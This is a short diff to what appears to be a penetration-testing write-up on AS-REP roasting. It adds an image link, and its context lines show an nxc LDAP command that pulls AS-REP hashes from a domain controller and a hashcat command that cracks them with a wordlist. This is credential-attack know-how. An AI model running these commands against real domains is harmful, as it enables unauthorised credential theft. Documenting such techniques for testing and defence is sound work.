@@ -180,6 +180,7 @@ An unauthenticated network attacker who can reach the domain controller may be a
 ```bash
 nxc ldap 10.10.10.10 -u valid_users.txt -p '' --asreproast asrep.txt
 ```
+![alt text](f01-2.png)
 3. Attempt the basic dictionary run, then the rule-based run:
 ```bash
 hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
